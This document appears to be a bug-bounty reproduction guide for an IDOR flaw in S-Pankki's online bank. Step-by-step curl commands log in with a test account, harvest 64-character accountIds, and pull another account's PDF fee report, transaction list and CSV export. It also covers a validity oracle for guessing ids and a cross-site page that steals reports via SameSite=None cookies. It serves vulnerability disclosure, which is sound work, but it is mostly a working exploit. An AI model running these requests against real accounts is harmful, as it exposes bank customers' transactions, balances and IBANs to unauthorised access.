# Manual Reproduction — S-Pankki accountId IDOR (curl-level)

Environment: `https://online.s-pankki.fi` (program test account). User-Agent `@wearehackerone` per scope. E-bank session idle timeout is 15 minutes — keep the same cookie jar within one run.

## Step 0 — Log in

```bash
JAR=/tmp/spk.jar; rm -f $JAR
UA='@wearehackerone'

# 1. open login page (sets initial JSESSIONID + CSRF)
curl -s -c $JAR -A "$UA" 'https://online.s-pankki.fi/ebank/' -o login.html
CSRF=$(grep -oP 'name="CSRFToken" content="\K[^"]+' login.html)

# 2. submit credentials (test account)
curl -s -b $JAR -c $JAR -A "$UA" 'https://online.s-pankki.fi/ebank/doLogin.do' \
  --data-urlencode "username=12345678" \
  --data-urlencode "password=123456" \
  --data-urlencode "csrfToken=$CSRF" -o login2.html
```

(If the login flow differs by a field name, the one-script PoC `pad_report_idor.sh` in this folder performs the exact working sequence.)

## Step 1 — Harvest the victim accountIds (they are in plain URLs)

```bash
# account list page contains links for EVERY account of the customer
curl -s -b $JAR -L -A "$UA" 'https://online.s-pankki.fi/ebank/redirectByMenu.do?menuId=accounts_mnu_accounts' -o accounts.html

grep -oP 'accountId=\K[0-9a-f]{64}' accounts.html | sort -u
# demo output:
# 96c143b2048f99eff3e805fa9f836d0898868e5c2971aec58588b54cba57192f   (ACC1 -> FI96 3939 0001 0006 03)
# d62a61a6e0a6da88c31aa4ec87d6cd2a682084eac690e932a6a22e0abe947442   (ACC2 -> FI74 3939 0001 0006 11)
```

**Attacker story:** in production these ids arrive via Referer headers (JSESSIONID is `SameSite=None`), browser history, bookmarks, analytics or server logs — no guessing required.

## Step 2 — Download the official PDF fee report for an ARBITRARY accountId (no CSRF token)

```bash
ACC_VICTIM=d62a61a6e0a6da88c31aa4ec87d6cd2a682084eac690e932a6a22e0abe947442

curl -s -b $JAR -A "$UA" \
  "https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=${ACC_VICTIM}&year=2025" -o victim.pdf

file victim.pdf
# victim.pdf: PDF document, application/pdf, 116300 bytes
```

The bank's own `getReportScript.js` (attached) shows this is the exact request the UI fires — a plain `window.open` GET.

## Step 3 — Prove the URL parameter wins over session context (the core IDOR)

```bash
# 3a. put the SESSION on ACC1 ...
curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/account/showAccountDetails.do?accountId=96c143b2048f99eff3e805fa9f836d0898868e5c2971aec58588b54cba57192f" -o ctx1.html

# 3b. ... then request the REPORT for ACC2
curl -s -b $JAR -A "$UA" \
  "https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=${ACC_VICTIM}&year=2025" -o matrix.pdf
```

Extract the IBAN from `matrix.pdf`: it contains **FI74 3939 0001 0006 11** (ACC2) even though the session context was ACC1. Reverse direction also holds. Full 4-cell matrix with md5s: `evidence/test_log.txt` §A, PDFs `01–04`.

## Step 4 — Full transaction data page via context switch

```bash
# set context to ACC2, then fetch the (parameterless) transaction list
curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/account/showAccountDetails.do?accountId=${ACC_VICTIM}" -o ctx2.html
curl -s -b $JAR -A "$UA" "https://online.s-pankki.fi/ebank/account/fetchTransactionList.do" -o txlist_acc2.html

wc -c txlist_acc2.html   # ~81 KB of ACC2 data (transactions, balances, history)
grep -o 'FI74' txlist_acc2.html | head -1
# compare with ACC1 context: ~75 KB page containing FI96
```

## Step 5 — CSV transaction export (second downloadable artifact)

```bash
# valid accountId, empty range -> 200 + real CSV
curl -s -b $JAR -A "$UA" \
  "https://online.s-pankki.fi/ebank/api/account/transactions/exportRangedTransactions.ds?accountId=${ACC_VICTIM}&fromDate=01012025&toDate=31122025&fileType=sba-CSV" -o exp.csv

cat exp.csv
# Kirjauspäivä;Maksupäivä;Summa;Tapahtumalaji;Maksaja;Saajan nimi;Saajan tilinumero;Saajan BIC-tunnus;Viitenumero;Viesti;Arkistointitunnus
```

Range containing transactions → `302 Location: /ebank/account/processTransactionList.do` (one-shot file processor; demo account caps the full row-stream there, production streams the complete rows — see `evidence/14_csv_export_302_flow.txt`).

## Step 6 — Validity oracle

```bash
curl -s -b $JAR -A "$UA" \
  "https://online.s-pankki.fi/ebank/pad/fees/getReport.ds?accountId=$(printf '0%.0s' {1..64})&year=2025" -o bad.bin
wc -c bad.bin   # 509 B  (HTTP 200, HTML error "Tapahtui odottamaton virhe")
# valid id  -> 116300 B application/pdf
# invalid   -> 509 B     HTML error      <- distinguishes valid from invalid ids
# same oracle exists on the CSV endpoint: invalid -> ~53-56 KB error page
```

## Step 7 — Cross-site demo

Open `xsite_pdf_steal.html` in a browser while logged into the e-bank: the page performs a top-level navigation to `getReport.ds?accountId=<victim>` — possible because the cookie is `SameSite=None; Secure; HttpOnly` and the endpoint requires no CSRF token.

## One-script version

```bash
bash pad_report_idor.sh        # runs steps 1-6, prints all sizes/md5s, verified 2026-10-14
```
